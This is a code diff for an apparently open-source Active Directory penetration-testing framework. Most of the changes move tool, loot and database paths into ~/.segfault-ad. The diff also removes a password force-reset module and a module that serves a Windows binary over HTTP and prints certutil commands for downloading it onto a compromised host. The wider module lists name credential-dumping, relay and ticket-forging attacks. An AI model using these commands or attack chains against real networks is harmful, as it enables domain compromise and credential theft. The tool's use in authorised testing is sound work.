@@ -154,7 +154,7 @@ def _startup_banner():
     boot = [
         (_chk('certipy','certipy-ad'), 'loading modules',       'certipy  bloodyAD  impacket  netexec',  0.10),
         (_chk('nmap'),                 'checking tools',         'nmap  rusthound-ce  hashcat  john',     0.08),
-        ('ok',                         'initializing workspace', '~/.segfault_workspaces',                0.07),
+        ('ok',                         'initializing workspace', '~/.segfault-ad',                0.07),
         (_chk('python3'),              'kerberos',               'krb5.conf  clockskew  ccache',          0.09),
         ('ok',                         'bloodhound engine',      'graph parser  pathfinder  edge mapper', 0.11),
         ('ok',                         'autopwn chains',         'certified  rustykey  redelegate',       0.06),
@@ -460,10 +460,12 @@ def check_tool(*names):
         p = shutil.which(n)
         if p: return p
     # also search ./tools/ subdirs for scripts cloned by installer
-    tools_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'tools')
-    if os.path.isdir(tools_dir):
+    tools_dir = os.path.expanduser('~/.segfault-ad/tools')
+    _local_tools = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'tools')
+    for _td in [tools_dir, _local_tools]:
+      if os.path.isdir(_td):
         for n in names:
-            for root, _, files in os.walk(tools_dir):
+            for root, _, files in os.walk(_td):
                 if n in files:
                     return os.path.join(root, n)
     # search known impacket examples locations on Kali
@@ -509,10 +511,10 @@ TOOL_INSTALL = {
     'faketime':             'sudo apt install faketime',
     'ntpdate':              'sudo apt install ntpdate',
     'smbclient':            'sudo apt install smbclient',
-    'pywhisker':            'git clone https://github.com/ShutdownRepo/pywhisker ~/tools/pywhisker',
-    'username-anarchy':     'git clone https://github.com/urbanadventurer/username-anarchy ~/tools/username-anarchy',
-    'gettgtpkinit':         'git clone https://github.com/dirkjanm/PKINITtools ~/tools/PKINITtools',
-    'getnthash':            'git clone https://github.com/dirkjanm/PKINITtools ~/tools/PKINITtools',
+    'pywhisker':            'git clone https://github.com/ShutdownRepo/pywhisker ~/.segfault-ad/tools/pywhisker',
+    'username-anarchy':     'git clone https://github.com/urbanadventurer/username-anarchy ~/.segfault-ad/tools/username-anarchy',
+    'gettgtpkinit':         'git clone https://github.com/dirkjanm/PKINITtools ~/.segfault-ad/tools/PKINITtools',
+    'getnthash':            'git clone https://github.com/dirkjanm/PKINITtools ~/.segfault-ad/tools/PKINITtools',
     'mitm6':                'pip install mitm6 --break-system-packages',
     'ntlmrelayx':           'pip install impacket --break-system-packages',
     'adidnsdump':           'pip install adidnsdump --break-system-packages',
@@ -522,13 +524,13 @@ TOOL_INSTALL = {
     'ffuf':                 'sudo apt install ffuf -y  # or: go install github.com/ffuf/ffuf/v2@latest',
     'nmap':                 'sudo apt install nmap -y',
     'pywerview':            'pip install "pywerview[kerberos]" --break-system-packages',
-    'AADInternals':         'git clone https://github.com/Gerenios/AADInternals ~/tools/AADInternals',
-    'adconnectdump':        'git clone https://github.com/fox-it/adconnectdump ~/tools/adconnectdump',
-    'gmsadumper':           'git clone https://github.com/micahvandeusen/gMSADumper ~/tools/gMSADumper',
+    'AADInternals':         'git clone https://github.com/Gerenios/AADInternals ~/.segfault-ad/tools/AADInternals',
+    'adconnectdump':        'git clone https://github.com/fox-it/adconnectdump ~/.segfault-ad/tools/adconnectdump',
+    'gmsadumper':           'git clone https://github.com/micahvandeusen/gMSADumper ~/.segfault-ad/tools/gMSADumper',
     'ldap3':                'pip install ldap3 --break-system-packages',
-    'krbrelayx':            'git clone https://github.com/dirkjanm/krbrelayx ~/tools/krbrelayx',
-    'targetedKerberoast':   'git clone https://github.com/ShutdownRepo/targetedKerberoast ~/tools/targetedKerberoast',
-    'pre2k':                'git clone https://github.com/garrettfoster13/pre2k ~/tools/pre2k',
+    'krbrelayx':            'git clone https://github.com/dirkjanm/krbrelayx ~/.segfault-ad/tools/krbrelayx',
+    'targetedKerberoast':   'git clone https://github.com/ShutdownRepo/targetedKerberoast ~/.segfault-ad/tools/targetedKerberoast',
+    'pre2k':                'git clone https://github.com/garrettfoster13/pre2k ~/.segfault-ad/tools/pre2k',
 }
 
 
@@ -927,7 +929,7 @@ class Target:
         self.domain=None; self.dc=None; self.dc_fqdn=None; self.user=None
         self.password=None; self.hash=None
         self.skew=None           # clock skew offset e.g. "+2h30m" detected from DC
-        self.loot_dir = os.path.join(os.getcwd(), 'loot')
+        self.loot_dir = os.path.expanduser('~/.segfault-ad/loot')
         self.workspace_set = False   # True only when user explicitly sets a workspace
         os.makedirs(self.loot_dir, exist_ok=True)
 
@@ -992,7 +994,7 @@ TARGET = Target()
 # =============================================================================
 # SQLITE DATABASE — persistent credential and finding storage across sessions
 # =============================================================================
-_DB_PATH = os.path.expanduser('~/.segfault_workspaces/segfault.db')
+_DB_PATH = os.path.expanduser('~/.segfault-ad/segfault.db')
 
 def _db_connect():
     os.makedirs(os.path.dirname(_DB_PATH), exist_ok=True)
@@ -1990,58 +1992,6 @@ class PassTheTicket(Module):
             if not tool: return
             env = os.environ.copy(); env['KRB5CCNAME'] = ccache
             run_cmd([tool,'-k','-no-pass',f'{target.domain}/{target.user}@{t_host}'], label=f'PTT {method}', env=env)
-        hr()
-
-class ChangePasswd(Module):
-    name='changepasswd'; description='impacket-changepasswd -- change or force-reset an AD account password'; category='lateral'
-    def run(self, target):
-        if not self.req(target): return
-        hr()
-        log('changepasswd — change or admin-reset an AD account password via RPC-SAMR or Kerberos','info')
-        hr()
-
-        t = self.need('impacket-changepasswd','changepasswd.py')
-        if not t: return
-
-        mode = self.ask('mode','admin-reset',['admin-reset','self-change'])
-        hr()
-
-        target_user   = self.ask('target account to change', target.user or '')
-        target_domain = self.ask('target domain', target.domain or '')
-        new_pass      = self.ask('new password', 'Password123!')
-        proto         = self.ask('protocol','rpc-samr',['rpc-samr','kerberos'])
-
-        if mode == 'admin-reset':
-            log(f'{ORANGE}Admin-reset: authenticate as a different user to force-reset the target account{RESET}','warn')
-            alt_user = self.ask('authenticating user (altuser)', target.user or '')
-            alt_pass = self.ask('authenticating password (altpass)', target.password or '')
-            cmd = [t,
-                   f'{target_domain}/{target_user}@{target.dc}',
-                   '-newpass', new_pass,
-                   '-dc-ip', target.dc,
-                   '-p', proto,
-                   '-altuser', alt_user,
-                   '-altpass', alt_pass]
-        else:
-            # self-change — needs current password
-            cur_pass = self.ask('current password', target.password or '')
-            cmd = [t,
-                   f'{target_domain}/{target_user}:{cur_pass}@{target.dc}',
-                   '-newpass', new_pass,
-                   '-dc-ip', target.dc,
-                   '-p', proto]
-
-        rc = run_cmd(cmd, label='changepasswd')
-        if rc == 0:
-            log(f'{GREEN}Password changed successfully{RESET}','success')
-            log(f'Account: {WHITE}{target_domain}\\{target_user}{RESET} → new pass: {WHITE}{new_pass}{RESET}','info')
-            # offer to update TARGET creds if changing the active user
-            if target_user == target.user:
-                update = self.ask('update active session password?','y',['y','n'])
-                if update == 'y':
-                    target.password = new_pass
-                    log(f'{GREEN}Session password updated{RESET}','success')
-            add_result('changepasswd', f'{target_domain}\\{target_user} password reset')
         hr()
 
 class NXCExec(Module):
@@ -6189,13 +6139,13 @@ class PyWhisker(Module):
         pw = check_tool('pywhisker')
         pw_script = None
         if not pw:
-            for p in [os.path.expanduser('~/HAX/tools/pywhisker/pywhisker/pywhisker.py'),
-                      os.path.expanduser('~/tools/pywhisker/pywhisker/pywhisker.py'),
+            for p in [os.path.expanduser('~/.segfault-ad/tools/pywhisker/pywhisker/pywhisker.py'),
+                      os.path.expanduser('~/.segfault-ad/tools/pywhisker/pywhisker/pywhisker.py'),
                       '/opt/pywhisker/pywhisker/pywhisker.py']:
                 if os.path.exists(p): pw_script = p; break
         if not pw and not pw_script:
             log('pywhisker not found','error')
-            log(f'Install: git clone https://github.com/ShutdownRepo/pywhisker ~/HAX/tools/pywhisker','info')
+            log(f'Install: git clone https://github.com/ShutdownRepo/pywhisker ~/.segfault-ad/tools/pywhisker','info')
             hr(); return
 
         t_user = self.ask('target user/computer')
@@ -6268,13 +6218,13 @@ class PKINIT(Module):
         hr()
         # find gettgtpkinit
         gtp = None
-        for p in [os.path.expanduser('~/HAX/tools/PKINITtools/gettgtpkinit.py'),
-                  os.path.expanduser('~/tools/PKINITtools/gettgtpkinit.py'),
+        for p in [os.path.expanduser('~/.segfault-ad/tools/PKINITtools/gettgtpkinit.py'),
+                  os.path.expanduser('~/.segfault-ad/tools/PKINITtools/gettgtpkinit.py'),
                   '/opt/PKINITtools/gettgtpkinit.py']:
             if os.path.exists(p): gtp = p; break
         if not gtp:
             log('gettgtpkinit.py not found','error')
-            log(f'Install: git clone https://github.com/dirkjanm/PKINITtools ~/HAX/tools/PKINITtools','info')
+            log(f'Install: git clone https://github.com/dirkjanm/PKINITtools ~/.segfault-ad/tools/PKINITtools','info')
             hr(); return
 
         t_user = self.ask('target user', target.user or '')
@@ -6328,8 +6278,8 @@ class UnPAC(Module):
 
         # find getnthash
         gnh = None
-        for p in [os.path.expanduser('~/HAX/tools/PKINITtools/getnthash.py'),
-                  os.path.expanduser('~/tools/PKINITtools/getnthash.py'),
+        for p in [os.path.expanduser('~/.segfault-ad/tools/PKINITtools/getnthash.py'),
+                  os.path.expanduser('~/.segfault-ad/tools/PKINITtools/getnthash.py'),
                   '/opt/PKINITtools/getnthash.py']:
             if os.path.exists(p): gnh = p; break
         if not gnh:
@@ -6369,99 +6319,6 @@ class UnPAC(Module):
             log(f'{GREEN}NT hash: {WHITE}{nt_hash}{RESET}','success')
             with open(os.path.join(target.loot_dir,'cracked.txt'),'a') as _f:
                 _f.write(f'{t_user}:{nt_hash}\n')
-        hr()
-
-# =============================================================================
-# UNPACMAN — Windows binary: auto-find ADCS template + UnPAC-the-hash
-# =============================================================================
-class UnPACman(Module):
-    name='unpacman'; description='unPACman -- auto-find ADCS template + UnPAC-the-hash (Windows binary)'; category='credentials'
-    def run(self, target):
-        if not self.req(target): return
-        hr()
-        log('unPACman — finds usable ADCS cert template, requests cert, recovers NT hash via UnPAC-the-hash','info')
-        log(f'{ORANGE}Runs on Windows — stage the exe to target first{RESET}','warn')
-        hr()
-
-        # locate built binary — check loot_dir, common tool paths, and cwd
-        search_dirs = [
-            target.loot_dir,
-            os.path.expanduser('~/segfault-ad/unPACman/unPACman/bin/Release'),
-            os.path.expanduser('~/HAX/tools/win'),
-            os.path.expanduser('~/tools/win'),
-            os.getcwd(),
-        ]
-        exe_src = None
-        for d in search_dirs:
-            p = os.path.join(d, 'unPACman.exe')
-            if os.path.exists(p):
-                exe_src = p; break
-
-        if not exe_src:
-            log(f'unPACman.exe not found — build it first:','error')
-            log(f'  {GREY}cd ~/segfault-ad/unPACman && dotnet build unPACman/unPACman.csproj -c Release{RESET}','info')
-            hr(); return
-
-        src_dir = os.path.dirname(exe_src)
-        deps    = ['BouncyCastle.Crypto.dll','Interop.CERTENROLLLib.dll','Interop.CERTCLILib.dll']
-
-        # stage exe + deps to loot_dir
-        os.makedirs(target.loot_dir, exist_ok=True)
-        staged = []
-        for fname in ['unPACman.exe'] + deps:
-            src = os.path.join(src_dir, fname)
-            dst = os.path.join(target.loot_dir, fname)
-            if os.path.exists(src):
-                import shutil as _sh
-                _sh.copy2(src, dst)
-                staged.append(fname)
-                log(f'{GREEN}staged{RESET} {WHITE}{fname}{RESET} → {GREY}{dst}{RESET}','success')
-            else:
-                if fname == 'unPACman.exe':
-                    log(f'Missing required file: {WHITE}{fname}{RESET}','error'); hr(); return
-                log(f'{ORANGE}optional dep not found, skipping:{RESET} {WHITE}{fname}{RESET}','warn')
-
-        hr()
-        remote_path = self.ask('drop path on target', r'C:\Windows\Temp\unPACman.exe')
-        remote_dir  = '\\'.join(remote_path.replace('/','\\').split('\\')[:-1])
-
-        # HTTP serve option
-        serve = self.ask('serve loot_dir over HTTP for upload?','y',['y','n'])
-        http_proc = None
-        if serve == 'y':
-            port = self.ask('HTTP port','8080')
-            http_proc = subprocess.Popen(
-                ['python3','-m','http.server', port],
-                cwd=target.loot_dir,
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            log(f'{GREEN}HTTP server PID {http_proc.pid} — serving {WHITE}{target.loot_dir}{RESET}','success')
-            tun0 = ''
-            try:
-                out = subprocess.check_output(['ip','addr','show','tun0'], text=True, stderr=subprocess.DEVNULL)
-                import re as _re
-                m = _re.search(r'inet (\d+\.\d+\.\d+\.\d+)', out)
-                tun0 = m.group(1) if m else ''
-            except Exception: pass
-            lhost = self.ask('your IP (lhost)', tun0 or '')
-            hr()
-            log(f'{WHITE}Upload via evil-winrm or certutil:{RESET}','info')
-            for fname in staged:
-                print(f'  {WHITE}certutil -urlcache -split -f http://{lhost}:{port}/{fname} {remote_dir}\\{fname}{RESET}')
-            hr()
-
-        log(f'{WHITE}Run on target (as the compromised user):{RESET}','info')
-        print(f'  {WHITE}{remote_path}{RESET}')
-        hr()
-        log('unPACman will auto-enumerate ADCS templates and recover the NT hash','info')
-        log(f'Recovered hash → use with: {WHITE}pth{RESET} or {WHITE}dcsync{RESET}','info')
-
-        if http_proc:
-            stop = self.ask('stop HTTP server?','y',['y','n'])
-            if stop == 'y':
-                http_proc.terminate()
-                log('HTTP server stopped','info')
-
-        add_result('unpacman', 'UnPAC-the-hash staged')
         hr()
 
 # =============================================================================
@@ -7126,9 +6983,9 @@ class Timeroast(Module):
             timecrack = check_tool('timecrack.py')
             if not timecrack:
                 for p in [
-                    os.path.expanduser('~/HAX/tools/Timeroast/extra-scripts/timecrack.py'),
+                    os.path.expanduser('~/.segfault-ad/tools/Timeroast/extra-scripts/timecrack.py'),
                     os.path.join('tools','Timeroast','extra-scripts','timecrack.py'),
-                    os.path.expanduser('~/tools/Timeroast/extra-scripts/timecrack.py'),
+                    os.path.expanduser('~/.segfault-ad/tools/Timeroast/extra-scripts/timecrack.py'),
                 ]:
                     if os.path.exists(p): timecrack = p; break
             if timecrack:
@@ -7684,7 +7541,7 @@ class RunasCs(Module):
             log(f'{GREEN}DLL generated: {WHITE}{out_dll}{RESET}','success')
 
             # check for RunasCs in win tools dir
-            win_dir = os.path.expanduser('~/HAX/tools/win')
+            win_dir = os.path.expanduser('~/.segfault-ad/tools/win')
             runasc_path = os.path.join(win_dir, 'RunasCs.exe')
             if os.path.exists(runasc_path):
                 import shutil as _sh_rc
@@ -9013,13 +8870,13 @@ class HealthCheck(Module):
 MODULES = {m.name: m for m in [
     Enum, LDAPEnum, BloodyEnum, Kerbrute, RPCEnum, GPPPassword, ADRecon, ADIDNSDump,
     Kerberoast, ASREPRoast, Spray,
-    SecretsDump, DCSync, PassTheHash, PassTheTicket, ChangePasswd, NXCExec, BloodyAttack, Certipy,
+    SecretsDump, DCSync, PassTheHash, PassTheTicket, NXCExec, BloodyAttack, Certipy,
     NTLMRelay, MITM6, Coerce, ZeroLogon, NoPac,
     GoldenTicket, SilverTicket, Delegation, RBCD, ShadowCredentials, PrintNightmare, Rubeus,
     Pathfind, SPNJack, BadSuccessor, ShareSpider, LAPS, GMSA, DPAPI, MSSQL,
     Trusts, ACLPersist, DCShadow, SMBClient, DiamondTicket, SapphireTicket,
     Nmap, FFuf, Unauth, HashCrack, AddComputer, PassTheCert, GroupScope, JEA, GodPotato,
-    PyWhisker, PKINIT, UnPAC, UnPACman, LDAPShell, CrossDomain,
+    PyWhisker, PKINIT, UnPAC, LDAPShell, CrossDomain,
     NXCModules, NetEnum, OwnerEdit, PassiveSniff, Enrich, Timeroast, Coercion, ZipSlip,
     Ligolo, BloodHoundQuery, AutoEnum, RunasCs, KeePass, FTP,
     DPloot, SCCM, Pre2K, ADIDNS,
@@ -9029,8 +8886,8 @@ MODULES = {m.name: m for m in [
 
 GROUPS = {
     'recon':        ['enum','ldapenum','bloodyenum','kerbrute','enum4linux','rpcenum','gpp','adrecon','dnsdump','adidns','pathfind','shares','mssql','unauth','bh-query','autoenum','ftp','healthcheck','pywerview','nmap','ffuf','nxcmodules'],
-    'credentials':  ['kerberoast','asreproast','spray','laps','lapstoolkit','gmsa','dpapi','dploot','hashcrack','unpac','unpacman','timeroast','keepass','sccm','pre2k','azureadsync'],
-    'lateral':      ['secretsdump','dcsync','pth','ptt','changepasswd','exec','bloody','smbclient','passthecert','jea','pkinit','ldapshell','ligolo','runasc'],
+    'credentials':  ['kerberoast','asreproast','spray','laps','lapstoolkit','gmsa','dpapi','dploot','hashcrack','unpac','timeroast','keepass','sccm','pre2k','azureadsync'],
+    'lateral':      ['secretsdump','dcsync','pth','ptt','exec','bloody','smbclient','passthecert','jea','pkinit','ldapshell','ligolo','runasc'],
     'exploitation': ['certipy','relay','mitm6','coerce','coercion','zerologon','nopac','spnjack','badsuccessor','addcomputer','groupscope','godpotato','pywhisker','crossdomain','zipslip',
                      'golden','silver','diamond','sapphire','rbcd','shadowcred','trusts','printnightmare','rubeus',
                      'syncjacking','dnsadmins'],
@@ -9046,7 +8903,7 @@ TOOL_CHECK = {
     'kerberoast':['impacket-GetUserSPNs'],
     'asreproast':['impacket-GetNPUsers'],'spray':['netexec','nxc','crackmapexec'],
     'secretsdump':['impacket-secretsdump'],'dcsync':['impacket-secretsdump'],
-    'pth':['impacket-wmiexec'],'ptt':['impacket-getTGT'],'changepasswd':['impacket-changepasswd','changepasswd.py'],'exec':['netexec','nxc'],
+    'pth':['impacket-wmiexec'],'ptt':['impacket-getTGT'],'exec':['netexec','nxc'],
     'bloody':['bloodyad','bloodyAD'],'certipy':['certipy','certipy-ad'],
     'relay':['impacket-ntlmrelayx'],'mitm6':['mitm6'],
     'coerce':['PetitPotam.py','Coercer','coercer','printerbug.py','dfscoerce.py'],
@@ -9055,7 +8912,7 @@ TOOL_CHECK = {
     'golden':['impacket-ticketer'],'silver':['impacket-ticketer'],
     'rbcd':['impacket-getST'],'shadowcred':['certipy','pywhisker'],'delegation':['impacket-findDelegation','bloodyad'],
     'jea':['pypsrp'],'godpotato':['impacket-wmiexec'],'groupscope':['bloodyad'],
-    'pywhisker':['pywhisker'],'pkinit':['python3'],'unpac':['python3'],'unpacman':[],'ldapshell':['certipy'],'crossdomain':['netexec','bloodyad'],
+    'pywhisker':['pywhisker'],'pkinit':['python3'],'unpac':['python3'],'ldapshell':['certipy'],'crossdomain':['netexec','bloodyad'],
     'timeroast':['timeroast'],
     'coercion':['PetitPotam.py','Coercer','coercer','printerbug.py','dfscoerce.py'],
     'ligolo':['ligolo-proxy','ligolo-agent'],
@@ -9869,7 +9726,7 @@ GIT_REPOS = [
     ('AADInternals',     'https://github.com/Gerenios/AADInternals',            None, 'AADInternals.psm1'),
 ]
 
-# Windows binaries — downloaded to ~/HAX/tools/win/
+# Windows binaries — downloaded to ~/.segfault-ad/tools/win/
 WIN_BINS = [
     # shells / pivoting
     ('RunasCs.exe',          'https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip',                                          'zip'),
@@ -9911,8 +9768,8 @@ def _git_installed(name, binary):
         for root, _, files in os.walk(dest):
             if binary in files: return True
         return True
-    # also check ~/HAX/tools
-    dest2 = os.path.join(os.path.expanduser('~/HAX/tools'), name)
+    # also check ~/.segfault-ad/tools
+    dest2 = os.path.join(os.path.expanduser('~/.segfault-ad/tools'), name)
     if os.path.isdir(dest2):
         for root, _, files in os.walk(dest2):
             if binary in files: return True
@@ -9980,7 +9837,7 @@ def run_install():
     krb5_missing = not krb5_ok
     rh_missing   = not check_tool('rusthound-ce','rusthound_ce')
     # check which win bins are missing
-    win_dir = os.path.expanduser('~/HAX/tools/win')
+    win_dir = os.path.expanduser('~/.segfault-ad/tools/win')
     os.makedirs(win_dir, exist_ok=True)
     win_missing = [(f,u,t) for f,u,t in WIN_BINS if not os.path.exists(os.path.join(win_dir,f))]
     total = len(pip_missing) + len(apt_missing) + len(git_missing) + (1 if krb5_missing else 0) + (1 if rh_missing else 0) + len(win_missing)
@@ -10030,7 +9887,7 @@ def run_install():
                 log(f'{GREEN}ok{RESET}: rusthound-ce','success')
                 # symlink into tools/ so check_tool finds it
                 rh_bin = os.path.expanduser('~/.cargo/bin/rusthound-ce')
-                tools_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)),'tools')
+                tools_dir = os.path.expanduser('~/.segfault-ad/tools')
                 os.makedirs(tools_dir, exist_ok=True)
                 link = os.path.join(tools_dir,'rusthound-ce')
                 if os.path.exists(rh_bin) and not os.path.exists(link):
@@ -10065,8 +9922,8 @@ def run_install():
             run_cmd(['sudo', 'snap', 'install', 'kerbrute'], label='snap install kerbrute')
         elif go:
             log('Building kerbrute from source via go...', 'info')
-            os.makedirs('tools', exist_ok=True)
-            kb_dir = os.path.join('tools', 'kerbrute')
+            os.makedirs(os.path.expanduser('~/.segfault-ad/tools'), exist_ok=True)
+            kb_dir = os.path.expanduser('~/.segfault-ad/tools/kerbrute')
             if not os.path.isdir(kb_dir):
                 run_cmd([git or 'git', 'clone', 'https://github.com/ropnop/kerbrute', kb_dir])
             run_cmd(['bash', '-c', f'cd {kb_dir} && go build -o kerbrute . && sudo cp kerbrute /usr/local/bin/'],
@@ -10105,12 +9962,13 @@ def run_install():
         log('pip: all packages present — skipping', 'success')
 
     # ── git repos ─────────────────────────────────────────────────────────
+    _tools_base = os.path.expanduser('~/.segfault-ad/tools')
     if git_missing:
         if git:
-            os.makedirs('tools', exist_ok=True)
-            log(f'git: cloning {len(git_missing)} repo(s) into ./tools/...', 'info')
+            os.makedirs(_tools_base, exist_ok=True)
+            log(f'git: cloning {len(git_missing)} repo(s) into ~/.segfault-ad/tools/...', 'info')
             for name, url, post_cmd, _ in git_missing:
-                dest = os.path.join('tools', name)
+                dest = os.path.join(_tools_base, name)
                 log(f'Cloning {WHITE}{name}{RESET}...', 'info')
                 git_env = os.environ.copy()
                 git_env['GIT_TERMINAL_PROMPT'] = '0'
@@ -10129,11 +9987,11 @@ def run_install():
                     log(f'{GREEN}ok{RESET}: {name}', 'success')
             # symlink scripts into tools/ root for easy PATH access
             for name, _, _, binary in git_missing:
-                dest = os.path.join('tools', name)
+                dest = os.path.join(_tools_base, name)
                 for root, _, files in os.walk(dest):
                     if binary in files:
                         src = os.path.join(root, binary)
-                        dst = os.path.join('tools', binary)
+                        dst = os.path.join(_tools_base, binary)
                         if not os.path.exists(dst):
                             try: os.symlink(os.path.abspath(src), dst)
                             except Exception: pass
@@ -10248,7 +10106,7 @@ readline.parse_and_bind('tab: complete')
 # =============================================================================
 # WORKSPACE MANAGEMENT
 # =============================================================================
-WORKSPACE_DIR = os.path.expanduser('~/.segfault_workspaces')
+WORKSPACE_DIR = os.path.expanduser('~/.segfault-ad/workspaces')
 
 def _ws_path(name): return os.path.join(WORKSPACE_DIR, name)
 def _ws_config(name): return os.path.join(_ws_path(name), 'target.ini')
@@ -12038,7 +11896,7 @@ def repl():
                     # try common locations
                     for p in ['/opt/PKINITtools/gettgtpkinit.py',
                                os.path.expanduser('~/PKINITtools/gettgtpkinit.py'),
-                               os.path.expanduser('~/HAX/tools/PKINITtools/gettgtpkinit.py')]:
+                               os.path.expanduser('~/.segfault-ad/tools/PKINITtools/gettgtpkinit.py')]:
                         if os.path.exists(p): gettgtpkinit = p; break
                 if gettgtpkinit:
                     log(f'{GREEN}PKINIT auth via gettgtpkinit{RESET}','info')
